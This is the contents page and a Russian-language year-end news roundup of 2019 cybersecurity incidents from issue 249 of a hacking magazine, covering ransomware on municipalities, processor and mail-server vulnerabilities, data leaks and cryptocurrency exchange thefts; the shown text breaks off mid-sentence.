

                                                  Декабрь 2019
            № 249
CONTENTS

    GIGANews
  Все самые важ ные новос ти безопасности за 2019 год

    Антивирусные буд ни
  Как ана литики Avast детектируют новые угро зы

    Как стар товал Nginx
  Игорь Сысоев о разработке зна менитого веб-сервера

     Android
  Уязвимость StrandHogg и обход огра ничений на доступ к камере и микрофону

    Воздушные лов кости
  Прос тые трюки, которые выруча ют при пен тесте Wi-Fi

    KRACK на практике
  Как работа ет ата ка на Wi-Fi с применением нашумевшей тех ники

    Охота на жуч ка
  Ка кими быва ют шпионские устройства и как их искать

    Защищаем микрокон троллер
  Как работа ет Firmware Hardening и Secure Boot на примере STM32

    В королевстве PWN
  Атака ret2bss, крип тооракулы и реверс-инжиниринг на виртуалке Smasher с Hack The Box

   Дырявые дис ки
  Эксплуатируем уязвимости в сетевых хра нилищах Synology

    От равлен ные документы
  Как исполь зовать самые опас ные баги в Microsoft Ofce за последнее время

    Как под чинить кон фиг
  Учим ся эксплуатировать новую уязвимость в PHP-FPM и Nginx

    Игра на доверии
  Пентестим Multicast DNS и Service discovery

    Обзор эксплоитов
  Критические баги в vBulletin, InuxDB и Django

    Боль шой проброс
  Оттачива ем искусс тво pivoting на виртуалках с Hack The Box

    Спаси и сох рани!
  Сравнива ем популярные программы для резер вного копирования

    Запасливый пингвин
  Программы для резер вного копиро вания в Linux

    MP3-пле ер своими руками
  Как собрать и запрограм мировать гад жет у себя дома

   Выбираем файрвол
  Про веря ем восемь домашних фай рволов на строгость

    Свобод ный полет
  Как программируют беспилот ники

     Тит ры
  Кто дела ет этот журнал
                                       Мария «Mifrill» Нефёдова
                                                    nefedova@glc.ru



Подходит к концу 2019 год, а зна чит, приш ло время подвести
его итоги и подумать о том, какие трен ды ожидают нас в гря‐
дущем 2020 году. В конце этой статьи ты найдешь прогнозы
ведущих ИБ‐компаний, а пока давай вспомним, какими взло‐
мами, уязвимостями и прочими инте ресными событи ями
запомнится нам год уходящий.





ВЗЛОМЫ
Крупнейший поставщик электроэнергии в Южной Африке (обес печивает
электроэнергией примерно 95% ЮАР и около 45% всего Африканского кон‐
тинента) — государственная энергетическая компания Eskom пострадала
от компрометации. Взлом произо шел из‐за того, что сотрудник компании
скачал на рабочую машину фейковый установщик игры The Sims 4.
  Один из крупнейших и старейших банков Маль ты — Bank of Valletta под‐
вергся кибератаке. Зло умышленники попыта лись похитить порядка 13 мил‐
лионов евро, и, как только сотрудники банка заметили неавторизованные
операции, было принято решение экс тренно при остановить работу. В итоге
все отделения Bank of Valletta увели в офлайн свои банкоматы, PoS‐системы,
а также временно прекратили работу сайт банка, сервисы электронных услуг
и внутренняя почта.
  Специалисты «Лабора тории Касперского» не зря называют 2019 год
годом атак вымогателей на муниципаль ные службы. Атакам шифровальщиков
в этом году подверглись множес тво городов:
 • власти американского округа Джексон стали жертвой атаки шиф роваль‐
  щика Ryuk (он же Ryunk) и заплатили вымога телям 400 тысяч долларов;
 • власти  города  Ривьера‐Бич  (штат  Фло рида)  выплатили  вымога‐
   телям 65 бит кой нов (око ло 600 тысяч долларов США);
 • спустя всего неделю после этого случая в похожей ситуации оказались
   власти города Лейк‐Сити (тоже шта та Флорида) с населением 65 тысяч
   человек. На заседа нии городского совета было еди ногласно принято
  решение зап латить зло умышленникам выкуп в раз мере 42 биткойнов (око‐
   ло 500 тысяч дол ларов);
 • муниципальные власти более чем 20 городов в Техасе стали жертвами
   скоординированной атаки шифровальщика Sodinokibi (REvil). Вымогатели
   потребовали у своих жертв 2,5 миллиона долларов выкупа в обмен на ключ
   для расшифровки файлов. Платить прес тупникам власти не стали;
 • власти Луизианы и вовсе ввели в шта те режим ЧП, причиной для которого
   послужила серия вымогательских атак, направленных на школьные округа
   в Северной Луизиане;
 • от шифровальщика пострадала компания City Power — один из крупней‐
  ших поставщиков электро энергии для южноафриканского мегаполиса
   Йоханнесбурга. В итоге жители крупнейшего города в Южной Африке
  массово жаловались на отключения электроэнергии;
 • группа Shadow Kill Hackers взя ла на себя ответс твенность за еще одну ата‐
   ку на системы Йоханнесбурга и потребовала от городских властей 4 бит‐
   койна (примерно 35 тысяч долларов).

Однако только городами атаки шифровальщиков, конечно, не ограничились.
Были скомпрометированы и другие необычные цели:
 • десять медицинских учреждений (три в американской Алабаме и еще семь
   в Австралии);
 • французский телевизионный канал M6, один из крупнейших в стране,
   а также метеорологический телеканал The Weather Channel;
 • сразу несколько промышленных компаний: один из главных в мире про‐
   изводителей алю миния компания Norsk Hydro, а также две крупные
   химические компании в США, производящие силиконы и смолы, — Hexion
   и Momentive;
 • канадский гигант в сфере лабора торной диагностики, компания LifeLabs
   признала, что была взломана и выплатила хакерам выкуп по совету прив‐
   леченных к делу экспертов.

В ходе вредоносной кампании «Операция ShadowHammer» пострадала ком‐
пания  Asus.  Произошедшее  представляло  собой  классическую  атаку
на  цепочку  поставок:  зло умышленники  скомпрометировали  компанию,
сумели закрепиться в сети и принялись раздавать бэкдоры через пре дус‐
тановленный на устройства Asus инс трумент для автоматического обновле‐
ния ASUS Live Update. Атака имела место меж ду июнем и нояб рем 2018 года
(то есть хакеры контролировали ASUS Live Update около полугода) и зат‐
ронула множество вла дельцев устройств  Asus. Аналитики считают,  что
в общей сложности из‐за случившегося пос традали более миллиона человек
по всему миру. Как выяс нилось поз же, Asus была не единственной жертвой
преступников.
  Специалисты Tencent Keen Security Lab предста вили масштабное иссле‐
дование, посвященное взло му автомобилей  Tesla. Исследователи про‐
демонстрировали на примере Tesla Model S 75, почему опасно пол ностью
полагаться на систему содействия управлению автомобилем (она же адап‐
тивный  круиз‐контроль, или Enhanced  Autopilot). Оказалось, достаточно
нанести на дорожное покрытие малозаметные для водите ля «помехи»,
и автомобиль примет их за часть дорожной разметки и, чтобы не пересекать
эту несуществующую линию, свернет со сво ей полосы (возможно, даже
на встречную).
   Хакерам удалось скомпрометировать учетные данные неназванного сот‐
рудника технической поддержки Microsoft, и в период с 1 января 2019 года
по 28 марта 2019 года третьи лица имели дос туп к данным, свя занным
с чужими email‐аккаунтами. Зло умышленники получи ли возможность прос‐
матривать чужие списки папок, темы писем, email‐адре са пользовате лей,
с которыми общалась жертва.





В мае 2019 года на официальных стра ницах соцсетей Армии обороны Изра‐
иля (ЦАХАЛ) появилось сообщение о необычном отражении кибератаки
со стороны ХАМАС. Представители ЦАХАЛ пояс нили, что сначала отразили
атаку в виртуальном пространстве, а потом ВВС развили этот успех в прос‐
транстве физическом. В доказа тельство военные опубликовали видео ави‐
аудара (отметим, что о таких бомбарди ровках предуп реждают заранее, чтобы
избежать жертв со стороны мирного населения).
  Представите ли Stack Overﬂow, крупнейшего в интерне те сайта вопросов
и ответов о программирова нии, подтвердили информацию об атаке на свой
ресурс. Неизвестные зло умышленники оста вались в системе почти неделю
и могли получить доступ к пользовательским данным. Хотя общая база дан‐
ных пользователей не была скомпрометирована, атакующие могли узнать IP‐
адреса, имена или email‐адреса небольшого числа пользователей Stack
Exchange.
  Неизвестные похитили у лидера группы Radiohead Тома Йорка 18 часов
неизданных записей, сделанных во время работы над альбомом OK Computer
(1997) и хранившихся на архивных мини‐дисках. Пос ле кражи хакеры попыта‐
лись шантажировать группу. За записи, не предназначенные для публики,
вымогатели требовали 150 тысяч долларов выкупа, а в противном случае
угрожали опубликовать их в открытом дос тупе. Музыканты не стали вес ти
переговоры со злоумышленниками или игнорировать проблему, а решили
поступить иначе: сами опубликова ли все 18 часов неизданных материалов
в открытом доступе.
  Эксперты Symantec за фиксировали интересный случай: русскоязычная
хакерская группа Turla (она же Waterbug, Snake, WhiteBear, VENOMOUS BEAR
и Kypton), известная ИБ‐специалис там уже давно, взломала другую небезыз‐
вестную хак‐группу, иранскую APT34 (она же Oilrig, HelixKitten и Crambus).
В итоге серверы «конкурентов» исполь зовались для распространения мал‐
вари среди систем, ранее уже зараженных вредоносами Oilrig.
  Обнаружилось, что в апреле 2018 года неизвестные хакеры проникли
в сеть НАСА и похитили око ло 500 Мбайт данных, свя занных с марсианскими
миссиями. Точкой компро метации стала сеть Лаборатории реактивного дви‐
жения НАСА (JPL). Зло умышленники обнаружили неавторизованное устрой‐
ство Raspberry Pi и с его помощью нашли в общей сети шлюз, что поз волило
им развить атаку далее. В общей слож ности хакеры похитили поряд‐
ка 500 Мбайт данных и 23 файла.
   Разработчики опенсорсного бра узера Pale Moon, которым пользуются
около миллиона человек, признались, что архивный сервер проекта (archive.‐
palemoon.org), где хранятся ста рые версии бра узера, был взломан. Атака
произошла еще в 2017 году, но долго оста валась незамеченной. Неизвес‐
тный злоумышленник заразил все ста рые сборки  Pale Moon мал варью
Win32/ClipBanker.DY, то есть трояном, похища ющим данные из буфера обме‐
на пострадавшей машины.
  Летом 2019 года ряд изда ний сообщили о взломе подрядчика ФСБ —
московской компании «Сайтэк».  Атакующие,  скрывающиеся под  псев‐
донимом 0v1ru$, разместили несколько скрин шотов в Twitter, а также подели‐
лись похищенными данными с «коллегами» из группировки Digital Revolution.
Те, в свою очередь, тоже опубликовали ряд доказательств взлома. Так,
в открытый доступ выложили скриншот интерфейса внутренней сети, а рядом
с названиями проектов («Арион», «Реляция», «Гривна» и так далее) стояли
имена их кураторов, сотрудников «Сайтэка». Похищенными документами
хакеры поделились с журналистами нескольких изданий, и дамп содержал
довольно подробное описание проектов «Сайтэка».
  Эксперты Google Project Zero за метили, что ряд неназ ванных сайтов более
двух лет атаковал пользователей iPhone при помощи 14 уязвимостей, объ‐
единенных  в  пять  цепочек  экспло итов.  Компрометация  происходила
без какого‐либо участия пользователей, достаточно было просто зайти
на вредоносный ресурс.
   Как выяснилось позже, похожие тактики применя лись также против поль‐
зователей Android и Windows и речь шла о весьма масштабной операции.
  По данным источников, кампания была направлена на уйгуров, мусульман‐
ское населе ние китайского региона Синь цзян. За людьми там и так давно
ведется массовая слежка, а более мил лиона уйгуров содержатся в тюрьмах
и воспитательных лагерях. То есть вредонос ные сай ты, похоже, были уйгур‐
скими.
   Twitter‐аккаунт Джека Дорси (Jack Dorsey), CEO Twitter, подвергся взлому.
Скомпрометировав учетную запись, злоумышленни ки принялись публиковать
от лица Дорси оскорби тельный и расистский контент и даже утверждали, буд‐
то в штаб‐квартире компании заложена бомба. Атака произошла по недос‐
мотру мобильного оператора, который допустил компрометацию и позволил
неавторизованному лицу использовать телефонный номер Дорси для отправ‐
ки SMS‐сообщений.
  После взлома разработчики Twitter наконец решили отключить устаревшую
функциональность отправки твитов через SMS‐сообщения.
   Если тебе кажется, что дипфейки не представляют серьезной угрозы, пора
подумать еще раз. Осенью 2019 года мошенники использовали голосовой
deepfake, чтобы во время телефонного разговора выдать себя за руково‐
дителя неназванной немецкой фирмы. По телефону фиктивный CEO, чей
голос был подделан при помощи ИИ, попросил главу неназванной дочерней
фирмы из Британии срочно перевес ти 220 тысяч евро на счет некоего вен‐
герского поставщика, хотя на самом деле этот счет принадлежал прес тупни‐
кам. Когда подмена вскрылась, часть денег уже была отправлена и поступила
на счет в Венгрии, откуда злоумышленники перевели средства в Мексику.
  Взлом кардерского ресурса BriansClub, на котором покупали и продавали
ворованные банковские карты, привел к крупной утечке данных. Похищенные
у BriansClub данные содержали более 26 миллионов записей о кре дитных
и дебетовых картах. Эти записи попали в руки злоумышленников через взло‐
манные интернет‐магазины и точки розничной торговли за последние четыре
года.
   Если в 2018 году исследова тели RiskIQ идентифицировали 12 груп‐
пировок, занимающихся ата ками MageCart, то теперь, по данным IBM, их нас‐
читывается уже 38. Такие хакеры все чаще проявляют креативность и для
внедрения скиммеров на сайты эксплуати руют маршрутизаторы, используют
поддельные домены Google, неправильно нас троенные бакеты AWS, CDN
(content delivery network, «сеть доставки контента») и даже рекламу.





УЯЗВИМОСТИ
Проблемы процессоров Intel не исчерпа ли себя с обнаружением уязвимос‐
тей Meltdown и Spectre, о которых мы так много рассказывали в прошлом
году. В 2019 году эксперты выявили целый ряд новых «процессорных» проб‐
лем, связанных с упреждающим (или спекулятивным — speculative) механиз‐
мом исполнения команд, включая Spoiler, RIDL, Fallout и ZombieLoad, Zom‐
bieLoad 2, NetCAT, TPM‐FAIL, Plundervolt.
  Сводная группа ученых из США, Австралии и Авс трии опубликовала док‐
лад о новой вариации атаки на проблему Rowhammer. Методика получила
название RAMBleed, и от предыду щих версий ее отличает опасная особен‐
ность: атаку можно использовать для кражи данных с целевого устройства,
а не только для изменения существу ющих данных или повыше ния привилегий.
  Эксперты Римского университета Ла Сапиенца создали алгоритм, спо‐
собный с высокой точ ностью определять, каким именно приложением поль‐
зовал ся человек, даже если речь идет о Tor‐трафике. Инстру мент не помогает
деанонимизировать пользователя, то есть узнать его реальный IP‐адрес
и иные детали. Однако воз можно установить, какое именно Android‐приложе‐
ние скрывает Tor‐трафик.
  Весной 2019 года в WinRAR ус транили опасную уязвимость, пред став‐
ляющую угрозу для всех 500 миллионов пользователей архиватора. Дело
в том, что найденная проб лема существовала в коде примерно 19 лет. Баг
был связан со сторонней библиотекой UNACEV2.DLL, которая входит в сос‐
тав практически всех версий архиватора с незапа мят ных времен. Атаки на эту
уязвимость не заставили себя ждать.
   Ученые из Кембриджского университета, Университета Райса и SRI In‐
ternational предупредили, что Thunderbolt‐периферия может представлять
угрозу для ряда операционных систем. Проб лема затрагивает Thunderbolt
всех версий, то есть Thunderbolt 1, 2 и 3. Зло умышленники могут создавать
вредоносные устрой ства Thunderbolt. На первый взгляд те будут казаться
совершенно обычными и работать в соответствии с заявленны ми харак‐
теристиками, но вместе с этим могут содержать вредоносный код и беспре‐
пятственно выпол нять раз личные действия «на изнанке» ОС.
  В рамках майского «вторника обновлений» компания Microsoft исправила
критическую  уязвимость  CVE‐2019‐0708  (она же  BlueKeep),  связанную
с работой Remote Desktop Services (RDS) и RDP. С помощью этого бага ата‐
кующие могут выполнять произвольный код без авторизации и распростра‐
нять свою малварь подобно червю, как, например, было с известны ми вре‐
доносами WannaCry и NotPetya. Проблема опас на для Windows Server 2008,
Windows 7, Windows 2003 и Windows XP, для которых, из‐за высокой серь‐
езности проблемы, были выпущены обновления безопасности.
  Осенью BlueKeep начали эксплуатировать злоумышленники. Пока баг при‐
меняется лишь для распространения майнера криптовалюты, то есть прес‐
тупники не используют весь потенциал уяз вимос ти.
  Специалисты Microsoft считают, что в будущем нас ожидают более раз‐
рушительные атаки, использующие BlueKeep, и расслабляться рано. Дело
в том,  что, по данным BinaryEdge, в Сети до сих пор насчитывается
более 700 тысяч уязвимых Windows‐систем (не считая тех, что расположены
внутри частных сетей, за брандмауэрами), то есть патчи по‐прежнему уста‐
новили далеко не все.





В июне 2019 года исследова тели нашли опас ную проблему в почтовом аген‐
те Exim, позволяющую зло умышленникам запускать команды от имени root
на  удаленных  почтовых серверах.  Уязвимость представляла опасность
для половины всех почтовых серверов в интернете. Эксперты предупрежда‐
ли, что эксплуатация уязвимос ти крайне проста, и прогнозировали, что зло‐
умышленники создадут экс плоит для проблемы за считаные дни, и, к сожале‐
нию, их прогнозы пол ностью оправда лись.
  Осенью в Exim выявили вто рую и третью похожие проблемы, которые
в теории тоже позволяли выполнить про извольный код на целевом сервере.
   Аналитики Check Point Research и специалис ты компании CyberInt обна‐
ружили цепочку уязвимостей в магазине игр Origin, раз работанном Electronic
Arts. Проблема могла привести к взлому акка унтов и краже личных дан‐
ных 300 миллионов геймеров по всему миру. Для эксплу атации проблемы
атакующим не нужно было прибегать к хитрым трюкам и заставлять поль‐
зователей «поделиться» своими учетными данными. Вмес то этого злоумыш‐
ленники могли восполь зовать ся заброшенными суб доменами EAGames, что‐
бы отслеживать запросы, сделанные действующими пользователями.
  Специалист компании IOActive Рубен Сантамарта (Ruben Santamarta) рас‐
сказал, что в сентябре прош лого года ему слу чайно удалось обнаружить
в Сети исходные коды Boeing 787 Dreamliner. Впос ледствии было под‐
тверждено, что эти work‐in‐progress‐коды были случайно оставле ны на обще‐
доступном сервере Boeing, принадлежавшем RnD‐подразделению компании.
Изучив исходники, исследова тель выявил в них ряд уязвимостей и пришел
к выводу, что благода ря этим багам теоретически воз можен даже угон
самолета.
  Многие устрой ства на Android (включая девай сы Samsung, Huawei, LG,
Sony и, возможно, других производителей) оказались уязвимы перед инте‐
ресными атаками. Понадобится подделать всего одно специальное SMS‐
сообщение, какие обычно приходят от операто ров мобильной связи, и зло‐
умышленник сможет перехватывать электронную почту или трафик с уязвимых
устройств.
   Атака Simjacker эксплуатирует SMS‐сообщения для передачи инструкций
SIM Toolkit (STK) и S@T Browser на SIM‐карте устройства. И это не просто кон‐
цепт: атака регулярно применя ется в реальности в пос ледние два года. Sim‐
jacker позволяет узнать данные о местополо жении пользовате ля для устрой‐
ств Apple, ZTE, Motorola, Samsung, Google, Huawei и даже IoT‐девай сов с SIM‐
картами. Хуже того, S@T Browser также дает воз можность совершать звонки,
отправлять сообщения, отключать SIM‐карту, запус кать команды AT‐модема,
открывать браузеры (например, с фишинговыми ссылками) и многое дру гое.
  Позже появилась информа ция о крайне похожей атаке, WIBattack, только
она предполагает эксплу ата цию Wireless Internet Browser (WIB) вместо S@T
Browser.
   RCE‐уязвимость CVE‐2019‐16759, обна руженная и исправленная в форум‐
ном движке vBulletin в конце сентября 2019 года, дорого обошлась ряду ком‐
паний. Из‐за это го бага пос тра дали официальные форумы Comodo, а также
итальянский и гол ландский ресурсы для секс‐работников (в этих странах
проституция законна), а также форумы компании ZoneAlarm, при надлежащей
Check Point.
  В апреле 2019 года ИБ‐эксперты Мэти Ванхоф (Mathy Vanhoef) и Эяль
Ронен  (Eyal Ronen) опубликовали информацию о комплексе проблем,
получившем имя DragonBlood — «в честь» уязвимого Dragonﬂy, механизма,
посредством которого клиенты проходят аутентификацию на устройствах
с под держкой нового стандарта WPA3. И хотя ранее счи талось, что данный
механизм «рукопожатия» безопа сен, Ванхоф и Ронен доказали, что это не
так.
  Под названием DragonBlood объеди нились  пять  уязвимостей:  отказ
в обслуживании, две проблемы, приводя щие к side‐channel‐утечкам, и еще
две проблемы, связанные с даунгрейдом соединений. В итоге DragonBlood
позволял атакующему, находя щемуся в зоне дос тупа Wi‐Fi‐сети, восста‐
новить пароли жертвы и проникнуть в сеть.
  Позже эксперты рас сказали еще о двух уязвимостях, появившихся уже
после того, как представители WiFi Alliance подготовили защиту от исходных
багов.
   Эксплоиты для уязвимос тей стремительно дорожают: теперь извес тный
брокер уязвимостей, компания Zerodium, платит за эксплоиты для WhatsApp
и iMessage по миллиону долларов; до 500 тысяч долларов за эксплоиты
для уязвимостей в Hyper‐V (Microsoft) и vSphere (VMware); а эксплоиты для An‐
droid впервые в истории стоят больше, чем экспло иты для iOS, — до 2,5 мил‐
лиона долларов США.





УТЕЧКИ
И ПРИВАТНОСТЬ
В Сети нашли огромный дамп информации под наз ванием «Кол лекция № 1»,
содержащий 772 904 991 уникальный email‐адрес и еще 21 222 975 уникаль‐
ных паролей.
  В феврале — апреле 2019 года хакер (или группа лиц), скрывающийся
под псевдонимом GnosticPlayers, выставил на продажу на торговой площадке
Dream Market данные почти одного миллиарда человек. Эти дампы появились
постепенно и были разбиты на пять отдельных «лотов» (1, 2, 3, 4, 5), в которые
суммарно вошла информация о пользователях и клиентах 44 различных ком‐
паний. После непродол жительного молчания хакер возобновил активность
летом, сообщив о взломе авс тра лийского сервиса графичес кого дизайна
Canva, входящего в top‐200 сайтов по версии Alexa, и выставив на продажу
информацию еще 139 миллионов человек.
  Злоумышленник признавался СМИ, что им движут два основных мотива:
желание заработать и стремление к славе. Он заявил, что хочет «войти
в историю», как это ранее, например, сделал хакер, известный под ником
Peace_of_Mind. В 2016 году именно он про дал на торговой площадке TheRe‐
alDeal информацию более чем о 800 миллионах человек.
  Компания Facebook вновь оказалась в центре нескольких скандалов,
в основном связанных с приватностью пользовательских данных:
 • в начале года выяснилось, что пароли 200–600 миллионов пользователей
   от Facebook Lite, Facebook и Instagram хра нились на серверах компании
   в формате простого текста, дос тупные тысячам сот рудников;
 • информацию о 540 миллионах пользователей об наружили на облачных
   серверах Amazon. По сло вам аналитиков, нашедших утечку, данные были
   собраны в социальной сети сторонними компаниями;
 • компанию уличили в стран ном методе верификации пользователей: соци‐
   альная сеть напрямую спрашивала у людей пароли от их почтовых ящиков
   и собрала данные 1,5 миллиона человек;
 • осенью в Сети нашли базу пользователей Facebook, содержавшую
   более 419 миллионов телефонных номеров пользователей.

Журналисты Vice Motherboard пообщались с нес колькими бывшими и нас‐
тоящими сотрудниками компании Snap, владеющей Snapchat, а также изу‐
чили внутренние кор поративные пись ма, попавшие в руки редакции. Как ока‐
залось, ряд департаментов внутри компании Snap не только имеют инстру‐
менты для слежки за пользователями, но и активно пользуются и даже зло‐
употребляют ими. Сотрудникам Snap доступны такие данные, как местополо‐
жение, сохраненные Snap’ы и личные данные пользователей, включая номера
телефонов и email‐адреса.
  Но не только сотрудники Snap имели воз можность шпионить за поль‐
зователями. Много лет назад подобные вольнос ти поз воляли себе и сот‐
рудники компании MySpace. Когда социальная сеть была в зените славы
(около десяти лет тому назад), служащие зло употребляли внутренним инстру‐
ментом Overlord, о котором не было извес тно ранее. Он поз волял видеть
пароли пользователей и читать их сооб щения. Порой сотрудники исполь‐
зовали этот бэкдор для получения доступа к учет ным данным своих партне‐
ров.


                                     Продолжение статьи →
← Начало статьи





  СМИ выяснили, что пог раничники уста навливают на смартфоны туристов,
  въезжающих в Китай, малварь. Судя по всему, влас ти ищут файлы, подпада‐
  ющие под опре деле ние исламистского экс тремистского контента, а также
  вполне безобидные материалы, тоже связанные с исламом (включая научные
   труды ведущих исследователей), и даже музыку японской группы Unholy
   Grave. Малварь собирает все записи из календаря телефона, список кон‐
   тактов, журналы вызовов и текстовые сооб щения, а затем загружает их
  на удаленный сервер. Также она сканиру ет зараженный девайс, изучая, какие
  приложения установлены, и в некоторых случаях извлекает из них имена
  пользователей.
    Неизвестный хакер взло мал Национальное налоговое управление Бол‐
  гарии и похитил лич ные данные миллионов человек. Изначально сообщалось,
   что во время инцидента были похищены данные примерно пяти миллионов
  граждан Болгарии, то есть около 70% населения страны. Но циф ра была
  завышена, так как БД содержали данные об инос транцах и уже покойных
  гражданах. Вскоре информация, которой хакер щедро поделился с болгар‐
  ской прессой, просочилась на хакерские форумы. Дамп содержал 57 папок
  размером 10,7 Гбайт с личной и финансовой информацией граждан.
    Министерство  юстиции США  уличило  сотрудников  компании  AT&T
   в получении более чем миллиона долларов взяток. Платили сотрудникам
  за внедрение вредоносного ПО и несанкциони рованного оборудования
   в сети компании, а также разблокировку примерно двух миллионов мобиль‐
  ных устройств. Так, преступники успешно отвя зали от сети AT&T свы ше двух
  миллионов устройств (в основном это были дорогие iPhone).
    Летом 2019 года ста ло извес тно, что сторонние под рядчики и сотрудники
  компаний Microsoft, Apple, Google, Facebook и Amazon слушают разговоры
  пользователей  с  голосовыми  ассистентами  и  не  только.  Разумеется,
   это делается ради улучшения качес тва услуг и «обу чения» алгоритмов.
     Эксперты и пользователи немедленно выступили с рез кой критикой,
  и Apple, Google, Facebook и Amazon поспешили заверить, что уже перестали
  «подслушивать» пользователей, а Microsoft обновила политики конфиден‐
  циальности и другие страницы, объясня ющие принципы работы Cortana
  и Skype Translator.
    Один из сотрудников компании Nokia подключил USB‐накопитель со ста‐
  рыми рабочими файлами к своему домашнему компьютеру, но из‐за ошибки
   в настройках его компьютер и этот носитель ока зались свободно дос тупны
  из интернета для любого желающего. Диск содержал около 1,7 Тбайт данных,
  проливающих свет на работу рос сийской СОРМ (Система  технических
  средств для обеспечения функций оперативно‐разыскных мероприятий),
   в частности в сетях оператора МТС.
     Бывший инженер Yahoo, прорабо тавший в компании более десяти лет,
  пользовался своим служебным положением: получал доступ к почтовым ящи‐
  кам молодых женщин и похищал отту да откро венные фото и видео. В общей
  сложности Руис взломал более 6000 учет ных записей, при чем некоторые
  из них принадлежали его коллегам и подругам. Из почтовых ящиков своих
  жертв хакер похищал эротические изоб ражения и видео, которые хранил
  дома на жестком диске.
     Сотрудник компании Trend Micro про дал мошенникам личную информа‐
  цию 68 тысяч клиентов (менее 1% от общей двенад цатимиллионной поль‐
  зовательской базы компании). В ито ге в распоряжении преступников ока‐
  зались имена клиентов, адреса электронной почты, номера заявок, поданных
   в службу поддержки, а в некоторых случаях и номера телефонов.





  Летом и осенью 2019 года СМИ сооб щили о серии утечек данных, которые
  были допущены крупными российскими банками и компани ями. В их числе
  были:
   • данные  о  владельцах  кредитных  карт  «Альфа‐банка»  и  клиентах
     «АльфаСтрахования». Продавец, опуб ликовавший соответству ющее объ‐
     явление на одном хакерском форуме, заявил, что у него есть свежие дан‐
     ные примерно 3500 клиентов банка и около 3000 клиентов «АльфаСтра‐
     хования»;
   • информация о вкладчиках ВТБ: в общей сложности 5000 строк данных;
   • сообщалось, что на черном рынке продают ся данные клиентов Сбер‐
     банка, включая информацию о 60 миллионах карт (как действующих, так
     и закрытых — в настоящее время у банка около 18 миллионов активных
      карт). Сначала представители банка приз нали факт утечки, однако заяви‐
      ли, что проблема кос нулась только 200 человек. Затем стало известно, что
     в конце сентября 2019 года сот рудник банка нес колькими траншами про‐
     дал одной из преступных групп в даркнете в совокупности 5000 учетных
     записей кредитных карт Уральско го банка Сбербанка, значительное
     количество из которых были устаревшими и неактивными;
   • через некоторое время у Сбербанка произошла еще одна утечка данных.
    На этот раз в Сети появилась БД, содержащая персональные данные кли‐
     ентов Сбербанка, но также покупателям дампа предлагали и запись пос‐
     леднего разговора поль зователя с кол‐центром банка. В пресс‐службе
    Сбербанка новую утечку отрицали;
   • по информации компании DeviceLock, в Сети про дают базу данных с ин‐
    формацией о клиентах «Бинбанка», содержащую 70 тысяч строк (по
     цене 5000 рублей за стро ку);
   • еще одна утечка коснулась примерно 900 тысяч человек, и в обнаружен‐
     ные БД включены данные о номерах телефонов, паспортах, мес тах работы
     клиентов Альфа‐банка, ОТП‐банка и ХКФ‐банка;
   • в Сети нашли базу данных, содержащую информацию почти о 9 миллионах
     пользователей «Билайн», подклю чивших домаш ний интернет;
   • логины и пароли примерно 450 тысяч клиентов Ozon попали в откры тый
     доступ, но представители компании заверили, что файл, о котором шла
      речь, ходит по Сети уже достаточно давно и содержит очень старые дан‐
     ные.





 КРИПТА
  По информации аналитической фирмы Chainalysis, всего две хакерские груп‐
  пы ответственны за 60% публично извес тных инцидентов, связанных с ата‐
  ками на криптовалютные биржи. Исследователи подсчитали, что прес тупни ки
  похитили уже около миллиарда долларов.
      GitHub‐аккаунт разработчиков криптовалюты Denarius был взломан, и в
  Windows‐клиент криптовалютного проекта внедрили мал варь AZORult.
     Пользователи кошельков Electrum пострадали от необычной фишинговой
   атаки, суммарно лишив шись более 4,6 миллиона долларов. Злоумышленники
  обрушили на серверы Electrum DDoS‐атаку, и в результате серверы кошелька
  оказывались недоступными для пользователей, клиенты автоматичес ки иска‐
  ли другие варианты для подклю чения и находили лишь вредоносные ноды
   атакующих.
    В ноябре официальный сайт криптовалюты Monero, предоставляющий
  бинарники для Linux и Windows, был скомпрометирован и рас пространял мал‐
   варь, ворующую средс тва пользователей. Как минимум один пользователь
  писал на Reddit, что потерял средства в результате данной атаки, тем самым
  подтверждая, что малварь была нацелена на кражу криптовалюты.
     Также атакам разной степени тяжести подверглось множес тво крип‐
  товалютных обменников. Ниже перечислим толь ко некоторые их них.
     Криптовалют ная биржа Cryptopia со общила, что понесла «значительные
  убытки» в результате кибера таки. Специалисты ут верждали, что даже спустя
  несколько недель, невзирая на все контрмеры со стороны разработчиков,
  злоумышленники продолжали грабить обменник.
     Криптовалют ная биржа Bithumb подверглась кибератаке в третий раз
  за последние два года. Так, первый взлом Bithumb произошел еще в
  июле 2017 года, и тогда со счетов ресурса было похищено неиз вестное
  количество Bitcoin и Ethereum (на нес колько миллионов долларов). Второй
  взлом случился летом 2018 года, и зло умышленники похитили 35 миллиардов
   вон, то есть около 31 миллиона долларов в криптовалюте (преимущес твенно
   Ripple). В результате третьего взлома с горячего кошелька биржи вывели
  более 3 миллионов токенов EOS (около 13 миллионов долларов) и 20 мил‐
  лионов токенов  Ripple  (примерно 6 миллионов дол ларов). Взломщики
  перевели похищенные средс тва на различные площадки, включая Huobi,
   HitBTC, WB, EXmo.





  Более 100 тысяч поль зователей канадской криптовалютной биржи Quadri‐
  gaCX лишились доступа к своим средствам. Дело в том, что соз датель ресур‐
  са Джеральд Коттен (Gerald Cotten) скончался, а после его смерти оказалось,
   что он был единственным, кто имел дос туп к холодному кошельку биржи.
    Неизвестным зло умышленникам уда лось похитить с горячего кошелька
  сингапурской криптовалютной биржи Bitrue 9,3 миллиона токенов Ripple
   (XRP) и 2,5 миллиона токенов Cardano (ADA) общей стоимостью 4,25 мил‐
  лиона долларов и 225 тысяч долларов соответственно. Произошедшее стало
   второй кибератакой на Bitrue в 2019 году. В начале года биржа оказалась
  жертвой   атаки  51%,  в  ходе  которой  злоумышленники  пытались
   похитить 13 тысяч токенов Ethereum Classic (ETC), но тогда подозрительную
   активность обнаружили вовремя и атаку уда лось предотвратить.
     Полной компромета ции подверглась инфраструктура одной из крупней‐
  ших в Японии криптовалютных бирж, Bitpoint. Атака затронула как горячие, так
  и холодные кошельки бир жи, в результате чего было украдено 3,5 мил лиарда
  иен (около 32 миллионов долларов) в криптовалю тах Bitcoin, Bitcoin Cash,
   Litecoin, Ripple и Ethereal. При этом только 2,5 миллиарда иен (23 миллиона
  долларов) принадлежали клиентам биржи, осталь ными средс твами владел
  сам обменник (это были резервные фонды и прибыль).
    Проблемы не обошли стороной и одну из крупнейших криптовалютных
  бирж мира — Binance.  Так, в мае  у пользователей ресурса похитили
  более 41 миллиона долларов в ходе масштабной и тщательно спланирован‐
  ной атаки, а в августе в Сети начали распростра няться данные KYC (Know
   Your Customer), якобы укра денные у Binance, за которые злоумышленники
  попросили выкуп. В конечном итоге представители биржи частично подтвер‐
